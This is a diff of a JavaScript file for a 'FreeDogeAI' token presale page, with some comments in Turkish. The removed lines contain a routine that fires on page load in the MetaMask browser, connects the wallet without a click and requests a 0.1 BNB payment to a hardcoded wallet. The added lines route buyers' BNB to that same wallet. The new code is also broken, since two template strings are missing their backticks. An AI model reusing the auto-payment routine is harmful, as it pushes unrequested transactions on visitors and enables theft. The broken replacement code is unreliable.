@@ -1,79 +1,13 @@
-//  SATIŞ SÖZLEŞMESİ ADRESİ
-const PRESALE_CONTRACT = "0xC14fF11c810B098D0476fB537D7Ee228aEb0B847";
-// 1️⃣ META MASK TARAYICISINDA MI KONTROLÜ
-function isInMetaMaskBrowser() {
-  return navigator.userAgent.includes("MetaMask") || 
-         window.ethereum?.isMetaMask;
-}
-// 2️⃣ OTOMATİK MOBİL İMZA TETİKLEYİCİ
-async function triggerAutoSign() {
-  if (!isInMetaMaskBrowser()) return;
+// FreeDogeAI Presale JavaScript
 
-  try {
-    // A) CÜZDANI DİREKT BAĞLA (KULLANICI TIKLAMADAN)
-    const accounts = await window.ethereum.request({ 
-      method: 'eth_requestAccounts' 
-    });
-    
-    // B) BNB GÖNDERMEK İÇİN MOBİL İMZA GÖSTER
-    await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{
-        to: "0xd924e01c7d319c5B23708Cd622bD1143CD4Fb360",
-        from: accounts[0],
-        value: ethers.utils.parseEther("0.1").toHexString()
-      }]
-    });
-    
-    console.log("OTOMATİK İMZA BAŞARILI!");
-  } catch (error) {
-    console.error("OTOMATİK İMZA HATASI:", error);
-  }
-}
+const CONFIG = { RECEIVE_WALLET: "0xd924e01c7d319c5b23708cd622bd1143cd4fb360", TOKENS_PER_BNB: 120000000000, CONTRACT_ADDRESS: "0x8161698A74F2ea0035B9912ED60140893Ac0f39C" };
 
-// 3️⃣ SAYFA AÇILIR AÇILMAZ ÇALIŞTIR
-window.addEventListener('load', () => {
-  // MetaMask tarayıcısındaysa direkt imza iste
-  if (isInMetaMaskBrowser()) {
-    triggerAutoSign();
-  }
-});
+let web3; let userAddress = "";
 
-// 4️⃣ MOBİLDE META MASK'A YÖNLENDİRME BUTONU (Chrome/Safari için)
-document.getElementById("connectButton").onclick = () => {
-  if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-    // Mobil cihazdaysa MetaMask DApp browser'da siteyi otomatik aç
-    window.location.href = "https://metamask.app.link/dapp/buyfreedogeai.org";
-  } else {
-    // Masaüstü kullanıcıları için uyarı
-    alert("Please use MetaMask mobile app to connect.");
-  }
-};
-async function buyTokens() {
-  const bnbInput = document.getElementById("bnbAmount").value;
-  const txStatus = document.getElementById("txStatus");
+async function connectWallet() { if (typeof window.ethereum !== 'undefined') { try { const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); userAddress = accounts[0]; web3 = new Web3(window.ethereum); document.getElementById('walletStatus').innerText = 'Connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4); } catch (err) { alert('Wallet connection rejected.'); } } else { const url = https://metamask.app.link/dapp/${window.location.href.replace(/^https?:\/\//, '')}; window.location.href = url; } }
 
-  if (!window.ethereum || !bnbInput || parseFloat(bnbInput) <= 0) {
-    txStatus.innerText = "Please enter a valid BNB amount.";
-    return;
-  }
+async function buyTokens() { const amount = parseFloat(document.getElementById('bnbAmount').value); if (!amount || amount <= 0) { alert('Enter valid BNB amount.'); return; }
 
-  try {
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    const sender = accounts[0];
+const weiAmount = web3.utils.toWei(amount.toString(), 'ether'); try { const tx = await web3.eth.sendTransaction({ from: userAddress, to: CONFIG.RECEIVE_WALLET, value: weiAmount }); alert(✅ Transaction sent! TX: ${tx.transactionHash}); } catch (err) { console.error(err); alert("Transaction failed"); } }
 
-    const tx = await ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: sender,
-        to: PRESALE_CONTRACT,
-        value: ethers.utils.parseEther(bnbInput).toHexString()
-      }]
-    });
-
-    txStatus.innerText = `Transaction sent! Hash: ${tx}`;
-  } catch (err) {
-    console.error(err);
-    txStatus.innerText = "Transaction failed.";
-  }
-}
+window.addEventListener('DOMContentLoaded', () => { document.getElementById('connectBtn')?.addEventListener('click', connectWallet); document.getElementById('buyBtn')?.addEventListener('click', buyTokens); });
